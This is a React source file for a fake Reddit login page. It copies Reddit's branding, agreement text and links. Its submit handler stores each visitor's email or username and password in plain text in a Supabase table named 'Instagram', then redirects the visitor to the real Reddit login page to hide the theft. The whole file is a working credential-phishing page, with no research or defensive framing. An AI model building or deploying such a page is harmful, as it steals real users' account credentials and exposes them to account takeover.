import React, { useState } from "react";
import "./RedditLogin.css";
import { supabase } from "../../supabase";

const RedditLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://www.reddit.com/login/";
    }
  };

  return (
    <div className="reddit-login-container">
      <div className="reddit-login-box">
        <div className="reddit-logo">👽</div>
        <h2>Log In</h2>
        <div className="reddit-login-agreement">
          By continuing, you agree to our{" "}
          <a
            href="https://www.redditinc.com/policies/user-agreement"
            target="_blank"
            rel="noopener noreferrer"
          >
            User Agreement
          </a>{" "}
          and acknowledge that you understand the{" "}
          <a
            href="https://www.reddit.com/policies/privacy-policy"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy Policy
          </a>
          .
        </div>
        <div className="reddit-login-alt">
          <button
            type="button"
            onClick={() => (window.location.href = "https://www.reddit.com/login/phone")}
          >
            Continue With Phone Number
          </button>
        </div>
        <div className="reddit-login-divider">
          <div className="line" />
          <div className="or">OR</div>
          <div className="line" />
        </div>
        <form className="reddit-login-form" onSubmit={handleSubmit}>
          <label className="reddit-login-label">Email or username *</label>
          <input
            type="text"
            className="reddit-login-input"
            placeholder="Email or username"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            required
          />
          <label className="reddit-login-label">Password *</label>
          <input
            type="password"
            className="reddit-login-input"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <a
            className="reddit-login-forgot"
            href="https://www.reddit.com/password"
            target="_blank"
            rel="noopener noreferrer"
          >
            Forgot password?
          </a>
          <button type="submit" disabled={loading}>
            {loading ? "Logging in..." : "Log In"}
          </button>
        </form>
        {success && <div className="reddit-success">Login saved!</div>}
        {error && <div className="reddit-error">{error}</div>}
        <div className="reddit-login-signup">
          New to Reddit?
          <a
            href="https://www.reddit.com/register/"
            target="_blank"
            rel="noopener noreferrer"
          >
            Sign Up
          </a>
        </div>
      </div>
    </div>
  );
};

export default RedditLogin;
